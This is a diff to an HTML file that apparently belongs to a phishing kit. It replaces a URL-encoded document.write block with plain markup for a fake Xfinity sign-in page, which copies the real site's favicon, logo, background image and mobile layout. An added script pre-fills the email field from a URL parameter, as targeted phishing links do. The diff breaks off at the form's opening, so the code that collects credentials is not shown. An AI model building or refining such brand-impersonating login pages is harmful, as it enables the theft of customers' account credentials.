@@ -1,6 +1,331 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Xfinity</title>
+
+<link rel="icon" href="https://login.xfinity.com/favicon.ico" type="image/x-icon">
+
 <script>
-document.write(unescape('%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%3Ctitle%3EXfinity%3C/title%3E%0A%0A%3Clink%20rel%3D%22icon%22%20href%3D%22https%3A//login.xfinity.com/favicon.ico%22%20type%3D%22image/x-icon%22%3E%0A%0A%3Cstyle%3E%0A%0A/*%20%3D%3D%3D%3D%3D%3D%20NEW%20LAYOUT%20STYLES%20%28ONLY%20ADDITIONS%29%20%3D%3D%3D%3D%3D%3D%20*/%0A%0A.page%7B%0A%20%20%20%20display%3Aflex%3B%0A%20%20%20%20min-height%3A100vh%3B%0A%20%20%20%20width%3A100%25%3B%0A%7D%0A%0A.left%7B%0A%20%20%20%20flex%3A0%200%20480px%3B%0A%20%20%20%20display%3Aflex%3B%0A%20%20%20%20align-items%3Acenter%3B%0A%20%20%20%20justify-content%3Acenter%3B%0A%20%20%20%20background%3A%23fff%3B%0A%7D%0A%0A.right%7B%0A%20%20%20%20flex%3A1%3B%0A%20%20%20%20background-image%3Aurl%28%22https%3A//assets.xfinity.com/assets/cima/login/default/ad/BAU-XM_CIMA_4.15.25_Update_Desktop.png%22%29%3B%0A%20%20%20%20background-size%3Acover%3B%0A%20%20%20%20background-position%3Acenter%3B%0A%20%20%20%20background-repeat%3Ano-repeat%3B%0A%7D%0A%0A/*%20Mobile%20behavior%20like%20real%20Xfinity%20*/%0A@media%20%28max-width%3A768px%29%7B%0A%20%20%20%20.right%7B%0A%20%20%20%20%20%20%20%20display%3Anone%3B%0A%20%20%20%20%7D%0A%20%20%20%20.left%7B%0A%20%20%20%20%20%20%20%20flex%3A1%3B%0A%20%20%20%20%7D%0A%7D%0A%0A/*%20%3D%3D%3D%3D%3D%3D%20YOUR%20ORIGINAL%20CSS%20%28UNTOUCHED%29%20%3D%3D%3D%3D%3D%3D%20*/%0A%0A@media%20%28max-width%3A%20768px%29%20%7B%0A%0A%20%20%20%20.form-container%20%7B%0A%20%20%20%20%20width%3A%20100vw%3B%0A%20%20%20%20%20height%3A%20100vh%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20.main-box%7B%0A%20%20%20%20width%3A%20100vw%3B%0A%20%20%20%20height%3A%20100vh%3B%0A%20%20%20%20padding-left%3A%203px%3B%0A%20%20%20%20padding-right%3A%203px%3B%0A%20%20%20%20%7D%0A%7D%0A%0A%0A.box%7B%0Aappearance%3A%20auto%3B%0Abackground-color%3A%20rgb%28246%2C%20246%2C%20249%29%3B%0Aborder-bottom-color%3A%20rgb%2898%2C%2098%2C%20108%29%3B%0Aborder-bottom-left-radius%3A%204px%3B%0Aborder-bottom-right-radius%3A%204px%3B%0Aborder-bottom-style%3A%20solid%3B%0Aborder-bottom-width%3A%201px%3B%0Aborder-image-outset%3A%200%3B%0Aborder-image-repeat%3A%20stretch%3B%0Aborder-image-slice%3A%20100%25%3B%0Aborder-image-source%3A%20none%3B%0Aborder-image-width%3A%201%3B%0Aborder-left-color%3A%20rgb%2898%2C%2098%2C%20108%29%3B%0Aborder-left-style%3A%20solid%3B%0Aborder-left-width%3A%201px%3B%0Aborder-right-color%3A%20rgb%2898%2C%2098%2C%20108%29%3B%0Aborder-right-style%3A%20solid%3B%0Aborder-right-width%3A%201px%3B%0Aborder-top-color%3A%20rgb%2898%2C%2098%2C%20108%29%3B%0Aborder-top-left-radius%3A%204px%3B%0Aborder-top-right-radius%3A%204px%3B%0Aborder-top-style%3A%20solid%3B%0Aborder-top-width%3A%201px%3B%0Abox-sizing%3A%20border-box%3B%0Acolor%3A%20rgb%2820%2C%2020%2C%2023%29%3B%0Acursor%3A%20text%3B%0Adisplay%3A%20inline-block%3B%0Afont-family%3A%20DMSans%2C%20Helvetica%2C%20sans-serif%3B%0Afont-feature-settings%3A%20normal%3B%0Afont-kerning%3A%20auto%3B%0Afont-optical-sizing%3A%20auto%3B%0Afont-size%3A%2016px%3B%0Afont-size-adjust%3A%20none%3B%0Afont-stretch%3A%20100%25%3B%0Afont-style%3A%20normal%3B%0Afont-variant-alternates%3A%20normal%3B%0Afont-variant-caps%3A%20normal%3B%0Afont-variant-east-asian%3A%20normal%3B%0Afont-variant-emoji%3A%20normal%3B%0Afont-variant-ligatures%3A%20normal%3B%0Afont-variant-numeric%3A%20normal%3B%0Afont-variant-position%3A%20normal%3B%0Afont-variation-settings%3A%20normal%3B%0Afont-weight%3A%20400%3B%0Aheight%3A%2056px%3B%0Aletter-spacing%3A%20normal%3B%0Aline-height%3A%2024px%3B%0Amargin-bottom%3A%200px%3B%0Amargin-left%3A%203px%3B%0Amargin-right%3A%200px%3B%0Amargin-top%3A%200px%3B%0Aoutline-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0Aoutline-offset%3A%202px%3B%0Aoutline-style%3A%20solid%3B%0Aoutline-width%3A%202px%3B%0Aoverflow-clip-margin%3A%200px%3B%0Aoverflow-x%3A%20clip%3B%0Aoverflow-y%3A%20clip%3B%0Apadding-block-end%3A%2015px%3B%0Apadding-block-start%3A%2015px%3B%0Apadding-bottom%3A%2015px%3B%0Apadding-inline-end%3A%2015px%3B%0Apadding-inline-start%3A%2015px%3B%0Apadding-left%3A%2015px%3B%0Apadding-right%3A%2015px%3B%0Apadding-top%3A%2015px%3B%0Atab-size%3A%204%3B%0Atext-align%3A%20left%3B%0Atext-indent%3A%200px%3B%0Atext-rendering%3A%20auto%3B%0Atext-shadow%3A%20none%3B%0Atext-size-adjust%3A%20100%25%3B%0Atext-transform%3A%20none%3B%0Atransition-behavior%3A%20normal%2C%20normal%2C%20normal%2C%20normal%3B%0Atransition-delay%3A%200s%2C%200s%2C%200s%2C%200s%3B%0Atransition-duration%3A%200s%2C%200s%2C%200s%2C%200.2s%3B%0Atransition-property%3A%20border-color%2C%20box-shadow%2C%20border-radius%2C%20padding%3B%0Atransition-timing-function%3A%20ease%2C%20ease%2C%20ease%2C%20ease-in-out%3B%0Avisibility%3A%20visible%3B%0Awidth%3A%20380px%3B%0Aword-spacing%3A%200px%3B%0A-webkit-rtl-ordering%3A%20logical%3B%0A-webkit-tap-highlight-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0A-webkit-border-image%3A%20none%3B%0A%0A%0A%7D%0A%0A.signin-button%20%7B%0Aalign-items%3A%20center%3B%0Aappearance%3A%20button%3B%0Abackground-color%3A%20rgb%2890%2C%2035%2C%20185%29%3B%0Abackground-image%3A%20none%3B%0Aborder-bottom-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0Aborder-bottom-left-radius%3A%204px%3B%0Aborder-bottom-right-radius%3A%204px%3B%0Aborder-bottom-style%3A%20solid%3B%0Aborder-bottom-width%3A%202px%3B%0Aborder-image-outset%3A%200%3B%0Aborder-image-repeat%3A%20stretch%3B%0Aborder-image-slice%3A%20100%25%3B%0Aborder-image-source%3A%20none%3B%0Aborder-image-width%3A%201%3B%0Aborder-left-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0Aborder-left-style%3A%20solid%3B%0Aborder-left-width%3A%202px%3B%0Aborder-right-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0Aborder-right-style%3A%20solid%3B%0Aborder-right-width%3A%202px%3B%0Aborder-top-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0Aborder-top-left-radius%3A%204px%3B%0Aborder-top-right-radius%3A%204px%3B%0Aborder-top-style%3A%20solid%3B%0Aborder-top-width%3A%202px%3B%0Abox-sizing%3A%20border-box%3B%0Acolor%3A%20rgb%28246%2C%20246%2C%20249%29%3B%0Acursor%3A%20pointer%3B%0Adisplay%3A%20flex%3B%0Aflex-direction%3A%20row%3B%0Afont-family%3A%20DMSans%2C%20Helvetica%2C%20sans-serif%3B%0Afont-feature-settings%3A%20normal%3B%0Afont-kerning%3A%20auto%3B%0Afont-optical-sizing%3A%20auto%3B%0Afont-size%3A%2015.3px%3B%0Afont-size-adjust%3A%20none%3B%0Afont-stretch%3A%20100%25%3B%0Afont-style%3A%20normal%3B%0Afont-variant-alternates%3A%20normal%3B%0Afont-variant-caps%3A%20normal%3B%0Afont-variant-east-asian%3A%20normal%3B%0Afont-variant-emoji%3A%20normal%3B%0Afont-variant-ligatures%3A%20normal%3B%0Afont-variant-numeric%3A%20normal%3B%0Afont-variant-position%3A%20normal%3B%0Afont-variation-settings%3A%20normal%3B%0Afont-weight%3A%20700%3B%0Aheight%3A%2056px%3B%0Ajustify-content%3A%20center%3B%0Ajustify-items%3A%20center%3B%0Aletter-spacing%3A%20normal%3B%0Aline-height%3A%2024px%3B%0Amargin-bottom%3A%2040px%3B%0Amargin-left%3A%205px%3B%0Amargin-right%3A%200px%3B%0Amargin-top%3A%2040px%3B%0Aoutline-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0Aoutline-offset%3A%202px%3B%0Aoutline-style%3A%20solid%3B%0Aoutline-width%3A%202px%3B%0Apadding-block-end%3A%2014px%3B%0Apadding-block-start%3A%2014px%3B%0Apadding-bottom%3A%2014px%3B%0Apadding-inline-end%3A%2028px%3B%0Apadding-inline-start%3A%2028px%3B%0Apadding-left%3A%2028px%3B%0Apadding-right%3A%2028px%3B%0Apadding-top%3A%2014px%3B%0Aposition%3A%20relative%3B%0Atab-size%3A%204%3B%0Atext-align%3A%20center%3B%0Atext-decoration-line%3A%20none%3B%0Atext-indent%3A%200px%3B%0Atext-rendering%3A%20auto%3B%0Atext-shadow%3A%20none%3B%0Atext-size-adjust%3A%20100%25%3B%0Atext-transform%3A%20none%3B%0Atouch-action%3A%20manipulation%3B%0Atransition-behavior%3A%20normal%3B%0Atransition-delay%3A%200s%3B%0Atransition-duration%3A%200.2s%3B%0Atransition-property%3A%20all%3B%0Atransition-timing-function%3A%20ease-in%3B%0Avisibility%3A%20visible%3B%0Awidth%3A%20118.68px%3B%0Aword-spacing%3A%200px%3B%0A-webkit-tap-highlight-color%3A%20rgba%280%2C%200%2C%200%2C%200%29%3B%0A-webkit-border-image%3A%20none%3B%0A%0A%7D%0A%0A%0A.sign-layout-title%7B%0Afont-family%3A%20XfinityBrown%2C%20DMSans%2C%20Helvetica%2C%20sans-serif%3B%0Acolor%3A%20black%3B%0Afont-size%3A%2025px%3B%0Afont-weight%3A%201000%3B%0Amargin-top%3A%2010px%3B%0A%7D%0A%0A.form-container%7B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20height%3A%20100vh%3B%0A%20%20%20%20width%3A%20100%25%3B%0A%7D%0A%0A.t-logo%7B%0Aposition%3A%20absolute%3B%0Atop%3A%200px%3B%0Aleft%3A%2033px%3B%0Amargin-left%3A%2010px%3B%0Amargin-bottom%3A%2028px%3B%0Apadding-top%3A%2028px%3B%0A%7D%0A%0A.t-logo%20img%20%7B%0A%20%20%20%20width%3A%2080px%3B%0A%20%20%20%20height%3A%20auto%3B%0A%7D%0A%0A.main-box%20%7B%0A%20%20%20%20background-color%3A%20rgb%28255%2C%20255%2C%20255%29%3B%0A%20%20%20%20box-sizing%3A%20border-box%3B%0A%20%20%20%20font-family%3A%20InterVariable%2C%20system-ui%2C%20sans-serif%3B%0A%20%20%20%20height%3A%20100vh%3B%0A%20%20%20%20margin-left%3A%2033px%3B%0A%20%20%20%20margin-right%3A%2033px%3B%0A%20%20%20%20max-width%3A%20480px%3B%0A%20%20%20%20padding%3A%2070px%2044px%2022px%3B%0A%20%20%20%20position%3A%20relative%3B%0A%20%20%20%20width%3A%20480px%3B%0A%7D%0A%0A/*%20%28all%20remaining%20original%20styles%20unchanged%29%20*/%0A%0A%3C/style%3E%0A%3C/head%3E%0A%0A%3Cbody%3E%0A%0A%3Cdiv%20class%3D%22page%22%3E%0A%0A%20%20%20%20%3C%21--%20LEFT%20SIDE%20%28FORM%29%20--%3E%0A%20%20%20%20%3Cdiv%20class%3D%22left%22%3E%0A%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-container%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22main-box%22%3E%0A%0A%3Cform%20id%3D%22contact%22%20class%3D%22form-horizontal%20well%22%3E%0A%0A%20%20%20%20%3Cdiv%20class%3D%22t-logo%22%3E%0A%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22https%3A//login.xfinity.com/static/images/global/xfinity-logo-grey.svg%22%20alt%3D%22Xfinity%22%3E%0A%20%20%20%20%3C/div%3E'));
-</script>
+        window.onload = function() {
+          // Function to extract query parameters from the URL
+          function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+          }
+      
+          // Get the 'email' parameter from the URL
+          const email = getQueryParam('email');
+          
+          // If an email is present in the URL, set it as the value of the email input field
+          if (email) {
+            document.querySelector('input[name="email"]').value = email;
+          }
+        };
+      </script>
+
+    
+<style>
+
+/* ====== NEW LAYOUT STYLES (ONLY ADDITIONS) ====== */
+
+.page{
+    display:flex;
+    min-height:100vh;
+    width:100%;
+}
+
+.left{
+    flex:0 0 480px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:#fff;
+}
+
+.right{
+    flex:1;
+    background-image:url("https://assets.xfinity.com/assets/cima/login/default/ad/BAU-XM_CIMA_4.15.25_Update_Desktop.png");
+    background-size:cover;
+    background-position:center;
+    background-repeat:no-repeat;
+}
+
+/* Mobile behavior like real Xfinity */
+@media (max-width:768px){
+    .right{
+        display:none;
+    }
+    .left{
+        flex:1;
+    }
+}
+
+/* ====== YOUR ORIGINAL CSS (UNTOUCHED) ====== */
+
+@media (max-width: 768px) {
+
+    .form-container {
+     width: 100vw;
+     height: 100vh;
+    }
+
+    .main-box{
+    width: 100vw;
+    height: 100vh;
+    padding-left: 3px;
+    padding-right: 3px;
+    }
+}
+
+
+.box{
+appearance: auto;
+background-color: rgb(246, 246, 249);
+border-bottom-color: rgb(98, 98, 108);
+border-bottom-left-radius: 4px;
+border-bottom-right-radius: 4px;
+border-bottom-style: solid;
+border-bottom-width: 1px;
+border-image-outset: 0;
+border-image-repeat: stretch;
+border-image-slice: 100%;
+border-image-source: none;
+border-image-width: 1;
+border-left-color: rgb(98, 98, 108);
+border-left-style: solid;
+border-left-width: 1px;
+border-right-color: rgb(98, 98, 108);
+border-right-style: solid;
+border-right-width: 1px;
+border-top-color: rgb(98, 98, 108);
+border-top-left-radius: 4px;
+border-top-right-radius: 4px;
+border-top-style: solid;
+border-top-width: 1px;
+box-sizing: border-box;
+color: rgb(20, 20, 23);
+cursor: text;
+display: inline-block;
+font-family: DMSans, Helvetica, sans-serif;
+font-feature-settings: normal;
+font-kerning: auto;
+font-optical-sizing: auto;
+font-size: 16px;
+font-size-adjust: none;
+font-stretch: 100%;
+font-style: normal;
+font-variant-alternates: normal;
+font-variant-caps: normal;
+font-variant-east-asian: normal;
+font-variant-emoji: normal;
+font-variant-ligatures: normal;
+font-variant-numeric: normal;
+font-variant-position: normal;
+font-variation-settings: normal;
+font-weight: 400;
+height: 56px;
+letter-spacing: normal;
+line-height: 24px;
+margin-bottom: 0px;
+margin-left: 3px;
+margin-right: 0px;
+margin-top: 0px;
+outline-color: rgba(0, 0, 0, 0);
+outline-offset: 2px;
+outline-style: solid;
+outline-width: 2px;
+overflow-clip-margin: 0px;
+overflow-x: clip;
+overflow-y: clip;
+padding-block-end: 15px;
+padding-block-start: 15px;
+padding-bottom: 15px;
+padding-inline-end: 15px;
+padding-inline-start: 15px;
+padding-left: 15px;
+padding-right: 15px;
+padding-top: 15px;
+tab-size: 4;
+text-align: left;
+text-indent: 0px;
+text-rendering: auto;
+text-shadow: none;
+text-size-adjust: 100%;
+text-transform: none;
+transition-behavior: normal, normal, normal, normal;
+transition-delay: 0s, 0s, 0s, 0s;
+transition-duration: 0s, 0s, 0s, 0.2s;
+transition-property: border-color, box-shadow, border-radius, padding;
+transition-timing-function: ease, ease, ease, ease-in-out;
+visibility: visible;
+width: 380px;
+word-spacing: 0px;
+-webkit-rtl-ordering: logical;
+-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+-webkit-border-image: none;
+
+
+}
+
+.signin-button {
+align-items: center;
+appearance: button;
+background-color: rgb(90, 35, 185);
+background-image: none;
+border-bottom-color: rgba(0, 0, 0, 0);
+border-bottom-left-radius: 4px;
+border-bottom-right-radius: 4px;
+border-bottom-style: solid;
+border-bottom-width: 2px;
+border-image-outset: 0;
+border-image-repeat: stretch;
+border-image-slice: 100%;
+border-image-source: none;
+border-image-width: 1;
+border-left-color: rgba(0, 0, 0, 0);
+border-left-style: solid;
+border-left-width: 2px;
+border-right-color: rgba(0, 0, 0, 0);
+border-right-style: solid;
+border-right-width: 2px;
+border-top-color: rgba(0, 0, 0, 0);
+border-top-left-radius: 4px;
+border-top-right-radius: 4px;
+border-top-style: solid;
+border-top-width: 2px;
+box-sizing: border-box;
+color: rgb(246, 246, 249);
+cursor: pointer;
+display: flex;
+flex-direction: row;
+font-family: DMSans, Helvetica, sans-serif;
+font-feature-settings: normal;
+font-kerning: auto;
+font-optical-sizing: auto;
+font-size: 15.3px;
+font-size-adjust: none;
+font-stretch: 100%;
+font-style: normal;
+font-variant-alternates: normal;
+font-variant-caps: normal;
+font-variant-east-asian: normal;
+font-variant-emoji: normal;
+font-variant-ligatures: normal;
+font-variant-numeric: normal;
+font-variant-position: normal;
+font-variation-settings: normal;
+font-weight: 700;
+height: 56px;
+justify-content: center;
+justify-items: center;
+letter-spacing: normal;
+line-height: 24px;
+margin-bottom: 40px;
+margin-left: 5px;
+margin-right: 0px;
+margin-top: 40px;
+outline-color: rgba(0, 0, 0, 0);
+outline-offset: 2px;
+outline-style: solid;
+outline-width: 2px;
+padding-block-end: 14px;
+padding-block-start: 14px;
+padding-bottom: 14px;
+padding-inline-end: 28px;
+padding-inline-start: 28px;
+padding-left: 28px;
+padding-right: 28px;
+padding-top: 14px;
+position: relative;
+tab-size: 4;
+text-align: center;
+text-decoration-line: none;
+text-indent: 0px;
+text-rendering: auto;
+text-shadow: none;
+text-size-adjust: 100%;
+text-transform: none;
+touch-action: manipulation;
+transition-behavior: normal;
+transition-delay: 0s;
+transition-duration: 0.2s;
+transition-property: all;
+transition-timing-function: ease-in;
+visibility: visible;
+width: 118.68px;
+word-spacing: 0px;
+-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+-webkit-border-image: none;
+
+}
+
+
+.sign-layout-title{
+font-family: XfinityBrown, DMSans, Helvetica, sans-serif;
+color: black;
+font-size: 25px;
+font-weight: 1000;
+margin-top: 10px;
+}
+
+.form-container{
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    width: 100%;
+}
+
+.t-logo{
+position: absolute;
+top: 0px;
+left: 33px;
+margin-left: 10px;
+margin-bottom: 28px;
+padding-top: 28px;
+}
+
+.t-logo img {
+    width: 80px;
+    height: auto;
+}
+
+.main-box {
+    background-color: rgb(255, 255, 255);
+    box-sizing: border-box;
+    font-family: InterVariable, system-ui, sans-serif;
+    height: 100vh;
+    margin-left: 33px;
+    margin-right: 33px;
+    max-width: 480px;
+    padding: 70px 44px 22px;
+    position: relative;
+    width: 480px;
+}
+
+/* (all remaining original styles unchanged) */
+
+</style>
+</head>
+
+<body>
+
+<div class="page">
+
+    <!-- LEFT SIDE (FORM) -->
+    <div class="left">
+
+        <div class="form-container">
+            <div class="main-box">
+
+<form id="contact" class="form-horizontal well">
+
+    <div class="t-logo">
+        <img src="https://login.xfinity.com/static/images/global/xfinity-logo-grey.svg" alt="Xfinity">
+    </div>
 
 
 
